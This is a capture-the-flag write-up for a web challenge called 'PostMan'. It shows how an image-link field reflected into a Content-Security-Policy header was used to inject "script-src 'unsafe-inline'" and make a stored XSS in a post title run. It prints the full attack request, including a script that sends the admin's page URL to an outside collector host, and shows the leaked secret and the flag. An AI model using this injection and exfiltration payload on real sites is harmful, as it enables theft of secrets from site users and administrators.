PostMan 
===
#### [web, 70p, 12 solves]
**TLDR**; simple XSS which was blocked by CSP. You needed to inject into CSP header to get XSS working.

The application let user to create posts with a title and an image. Image had to be passed in form of a link. You could report post to the admin who will inspect it (typical XSS challange).    
Right of a bat I found simple XSS in title field `<script>alert(1)</script>`, but it was blocked due to CSP header that server set in the response:
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 518
Content-Security-Policy: default-src 'self'; img-src https://i.imgur.com/SW3HsEm.png; connect-src *;
Set-Cookie: session=91ddc442-ea0c-47ef-bc81-9cbe057f01df; Expires=Sat, 25-Jan-2020 20:42:04 GMT; HttpOnly; Path=/
Server: Werkzeug/0.14.1 Python/3.8.0
Date: Wed, 25 Dec 2019 20:42:04 GMT
```
At that moment I realised that the link to the image is inserted into CSP header. My first thought was the header injection, but that lead me nowhere. Flask is smart enought to detect new lines in response headers.
After a while I thought about CSP injection. From the CSP header I knew that there were 3 policies defined, `default-src` , `img-src` for our image in the post and `connect-src` (not sure why that one is defined). The default policy allows for the content only from the challenge site origin. When `script-src` policy isn't defined, it inherits from default one, so that why XSS from earlier was blocked. To make it work, I needed to somehow define `script-src` policy with `unsafe-inline` value, which allows for html script tag usage (`<script></script>`).
And that's exactly what I did. I injected `script-src` policy into the link field. The final request looked like that (post data url decoded for better readability):
```
POST / HTTP/1.1
Host: ctf.kaf.sh:3030
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.kaf.sh:3030/
Content-Type: application/x-www-form-urlencoded
Content-Length: 172
Connection: close
Cookie: session=91ddc442-ea0c-47ef-bc81-9cbe057f01df
Upgrade-Insecure-Requests: 1

title=<script>document.location = 'http://myserver.local/?' + document.URL;</script>&pictureSrc=https://i.imgur.com/SW3HsEm.png; script-src 'unsafe-inline'
```
XSS was finally triggered. During CTF I used XSS hunter for the payload since I didn't knew what or where to look for the flag, but here I posted more direct solution that will send whole URL. I reported that post to the admin and after few seconds I've got that request
```
GET /?http://ctf.kaf.sh:3030/post/5?secret=7NKuGbDnFEWijCXtmPpTQVegzk95yRS6 HTTP/1.1
Host: myserver.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```
When I visited `http://ctf.kaf.sh:3030/?secret=7NKuGbDnFEWijCXtmPpTQVegzk95yRS6`, I've got the flag
`KAF{c5P_1nJ3c710ns_4r3_FUn}`
